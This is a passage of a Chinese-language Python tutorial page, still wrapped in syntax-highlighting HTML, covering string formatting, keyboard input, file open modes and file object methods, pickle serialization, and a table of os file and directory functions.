string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># one-two</span><span class="token comment"># 索引输入</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1}-{0}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># two-one</span><span class="token comment"># 关键字参数输出</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{name}-{age}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>age<span class="token operator">=</span><span class="token string">'one'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># two-one</span><span class="token comment"># 结合</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1}-{0}-{test}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> test<span class="token operator">=</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2-1-3</span><span class="token keyword">import</span> math<span class="token comment"># !a (使用 ascii()), !s (使用 str()) 和 !r (使用 repr())</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{!a}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3.141592653589793</span><span class="token comment"># :后面.加数字代表保留几位小数，和类型</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:.3f}。'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3.142。</span><span class="token comment"># :后面加整数，表示证该域至少有这么多的宽度</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">for</span> name<span class="token punctuation">,</span> number <span class="token keyword">in</span> table<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:10} ==&gt; {1:10d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Google     ==&gt;          1Runoob     ==&gt;          2Taobao     ==&gt;          3'''</span><span class="token comment"># 传入一个字典, 然后使用方括号 [] 来访问键值</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob: 2; Google: 1; Taobao: 3</span><span class="token comment"># 通过在 table 变量前使用 ** 来实现相同的功能</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">**</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob: 2; Google: 1; Taobao: 3</span><span class="token triple-quoted-string string">'''one-twotwo-onetwo-one2-1-33.1415926535897933.142。Google     ==&gt;          1Runoob     ==&gt;          2Taobao     ==&gt;          3Runoob: 2; Google: 1; Taobao: 3Runoob: 2; Google: 1; Taobao: 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="旧式字符串格式化"><a href="#旧式字符串格式化" class="headerlink" title="旧式字符串格式化"></a>旧式字符串格式化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%5.3f'</span> <span class="token operator">%</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token comment"># 3.142</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="读取键盘输入"><a href="#读取键盘输入" class="headerlink" title="读取键盘输入"></a>读取键盘输入</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">strstr <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入："</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入的内容是: "</span><span class="token punctuation">,</span> strstr<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>strstr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传入的值都为str</span><span class="token comment"># 输入三角形的三边长</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入三角形三边的长："</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># 计算三角形的半周长p</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token comment"># 计算三角形的面积s</span>s <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">0.5</span><span class="token comment"># 输出三角形的面积</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"三角形面积为："</span><span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'.2f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''请输入：9你输入的内容是:  9&lt;class 'str'&gt;请输入三角形三边的长：8 7 9三角形面积为： 26.83'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读和写文件"><a href="#读和写文件" class="headerlink" title="读和写文件"></a>读和写文件</h3><p>open() 返回一个 file 对象</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>filename：包含了你要访问的文件名称的字符串值</li><li>mode：决定了打开文件的模式：只读，写入，追加等，默认文件访问模式为只读(r)</li></ul><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="left">rb</td><td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="left">rb+</td><td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="left">w</td><td align="left">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb</td><td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb+</td><td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">a</td><td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">ab</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="left">ab+</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><h4 id="文件对象的方法"><a href="#文件对象的方法" class="headerlink" title="文件对象的方法"></a>文件对象的方法</h4><h5 id="f-read"><a href="#f-read" class="headerlink" title="f.read()"></a>f.read()</h5><p>f.read(size)将读取一定数目的数据, 然后作为字符串或字节对象返回，size 是一个可选的数字类型的参数，当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开一个文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-readline"><a href="#f-readline" class="headerlink" title="f.readline()"></a>f.readline()</h5><p>f.readline() 会从文件中读取单独的一行，换行符为 ‘\n’，f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开一个文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-readlines"><a href="#f-readlines" class="headerlink" title="f.readlines()"></a>f.readlines()</h5><p>f.readlines() 将返回该文件中包含的所有行，如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开一个文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 打开一个文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-write"><a href="#f-write" class="headerlink" title="f.write()"></a>f.write()</h5><p>f.write(string) 将 string 写入到文件中, 然后返回写入的字符数</p><p>不是字符串的需要先转换</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开一个文件</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"Python 是一个非常好的语言。\n是的，的确非常好!!\n"</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 29</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-tell"><a href="#f-tell" class="headerlink" title="f.tell()"></a>f.tell()</h5><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数</p><h5 id="f-seek"><a href="#f-seek" class="headerlink" title="f.seek()"></a>f.seek()</h5><ol><li>f.seek(offset, from_what) 函数改变文件当前的位置</li><li>from_what 的值， 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾</li><li>from_what 值为默认为0，即文件开头</li></ol><ul><li>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符</li><li>seek(x,1) ： 表示从当前位置往后移动x个字符</li><li>seek(-x,2)：表示从文件的结尾往前移动x个字符</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/foo.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb+'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'0123456789abcdef'</span><span class="token punctuation">)</span><span class="token comment"># 16</span>f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>   <span class="token comment"># 移动到文件的第六个字节</span><span class="token comment"># 5</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># b'5'</span>f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 移动到文件的倒数第三字节</span><span class="token comment"># 13</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># b'd'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-close"><a href="#f-close" class="headerlink" title="f.close()"></a>f.close()</h5><p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源</p><h4 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h4><p>python的pickle模块实现了基本的数据序列和反序列化</p><p>基本接口：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">,</span>protocol<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有了 pickle 这个对象, 就能对 file 以读取的形式打开:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token comment"># 使用pickle模块将数据对象保存到文件</span>data1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">6j</span><span class="token punctuation">]</span><span class="token punctuation">,</span>         <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">u'Unicode string'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">}</span>selfref_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>selfref_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>selfref_list<span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># Pickle dictionary using protocol 0.</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data1<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token comment"># Pickle the list using the highest protocol available.</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>selfref_list<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="File-文件-方法"><a href="#File-文件-方法" class="headerlink" title="File(文件)方法"></a>File(文件)方法</h2><h3 id="open-方法"><a href="#open-方法" class="headerlink" title="open()方法"></a>open()方法</h3><p>open() 函数常用形式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完整的语法格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> closefd<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> opener<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明</p><ul><li>file: 必需，文件路径（相对或者绝对路径）</li><li>mode: 可选，文件打开模式</li><li>buffering: 设置缓冲</li><li>encoding: 一般使用utf8</li><li>errors: 报错级别</li><li>newline: 区分换行符</li><li>closefd: 传入的file参数类型</li><li>opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。</li></ul><p>mode 参数</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">t</td><td align="left">文本模式 (默认)。</td></tr><tr><td align="left">x</td><td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="left">b</td><td align="left">二进制模式。</td></tr><tr><td align="left">+</td><td align="left">打开一个文件进行更新(可读可写)。</td></tr><tr><td align="left">U</td><td align="left">通用换行模式（<strong>Python 3 不支持</strong>）。</td></tr><tr><td align="left">r</td><td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="left">rb</td><td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="left">rb+</td><td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w</td><td align="left">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb</td><td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb+</td><td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">a</td><td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">ab</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="left">ab+</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><p>默认为文本模式，如果要以二进制模式打开，加上 <strong>b</strong> </p><h3 id="file-对象"><a href="#file-对象" class="headerlink" title="file 对象"></a>file 对象</h3><p>file 对象使用 open 函数来创建</p><p>file 对象常用的函数</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-close.html">file.close()</a>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-flush.html">file.flush()</a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-fileno.html">file.fileno()</a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-isatty.html">file.isatty()</a>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-next.html">file.next()</a><strong>Python 3 中的 File 对象不支持 next() 方法。</strong>返回文件下一行。</td></tr><tr><td align="left">6</td><td align="left">[file.read(<a href="https://www.runoob.com/python3/python3-file-read.html">size])</a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="left">7</td><td align="left">[file.readline(<a href="https://www.runoob.com/python3/python3-file-readline.html">size])</a>读取整行，包括 “\n” 字符。</td></tr><tr><td align="left">8</td><td align="left">[file.readlines(<a href="https://www.runoob.com/python3/python3-file-readlines.html">sizeint])</a>读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td></tr><tr><td align="left">9</td><td align="left">[file.seek(offset<a href="https://www.runoob.com/python3/python3-file-seek.html">, whence])</a>移动文件读取指针到指定位置</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-tell.html">file.tell()</a>返回文件当前位置。</td></tr><tr><td align="left">11</td><td align="left">[file.truncate(<a href="https://www.runoob.com/python3/python3-file-truncate.html">size])</a>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-write.html">file.write(str)</a>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-writelines.html">file.writelines(sequence)</a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr></tbody></table><h2 id="OS-文件-目录方法"><a href="#OS-文件-目录方法" class="headerlink" title="OS 文件/目录方法"></a>OS 文件/目录方法</h2><p>一部分函数只能在linux中使用</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-access.html">os.access(path, mode)</a> 检验权限模式</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chdir.html">os.chdir(path)</a> 改变当前工作目录</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chflags.html">os.chflags(path, flags)</a> 设置路径的标记为数字标记。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chmod.html">os.chmod(path, mode)</a> 更改权限</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chown.html">os.chown(path, uid, gid)</a> 更改文件所有者</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chroot.html">os.chroot(path)</a> 改变当前进程的根目录</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-close.html">os.close(fd)</a> 关闭文件描述符 fd</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-closerange.html">os.closerange(fd_low, fd_high)</a> 关闭所有文件描述符，从 fd_low (包含) 到 fd_high (不包含), 错误会忽略</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-dup.html">os.dup(fd)</a> 复制文件描述符 fd</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-dup2.html">os.dup2(fd, fd2)</a> 将一个文件描述符 fd 复制到另一个 